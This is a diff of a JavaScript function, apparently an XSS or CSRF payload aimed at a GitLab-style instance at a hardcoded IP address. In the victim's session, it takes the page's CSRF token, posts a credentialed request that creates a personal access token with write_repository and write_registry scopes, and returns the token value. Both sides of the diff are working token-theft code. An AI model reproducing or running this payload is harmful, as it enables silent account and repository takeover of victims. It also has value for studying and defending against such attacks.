@@ -1,22 +1,10 @@
 async function getToken() {
-  
-  const response1 = await fetch(
-    "https://65.52.77.188/-/profile/personal_access_tokens",
-    {
-      credentials: "include",
-      method: "GET",
-      mode: "cors"
-    }
-  );
 
   const formData = new FormData();
-
-  const parser1 = new DOMParser();
-  const doc1 = parser1.parseFromString(await response1.text(), "text/html");
   
   formData.append(
-    'authenticity_token',
-    doc1.querySelector('meta[name="csrf-token"]').content
+    document.querySelector('meta[name="csrf-param"]').content,
+    document.querySelector('meta[name="csrf-token"]').content
   );
 
   formData.append("personal_access_token[name]", "test");
@@ -25,7 +13,7 @@ async function getToken() {
   formData.append("personal_access_token[scopes][]", "write_repository");
   formData.append("personal_access_token[scopes][]", "write_registry");
 
-  const response2 = await fetch(
+  const response = await fetch(
     "https://65.52.77.188/-/profile/personal_access_tokens",
     {
       credentials: "include",
@@ -34,10 +22,11 @@ async function getToken() {
       mode: "cors"
     }
   )
+  
+  const parser = new DOMParser();
+  const doc = parser.parseFromString(await response.text(), "text/html");
 
-  const parser2 = new DOMParser();
-  const doc2 = parser1.parseFromString(await response2.text(), "text/html");
-  return doc2.querySelector("#created-personal-access-token").value;
+  return doc.querySelector("#created-personal-access-token").value;
 }
 
 
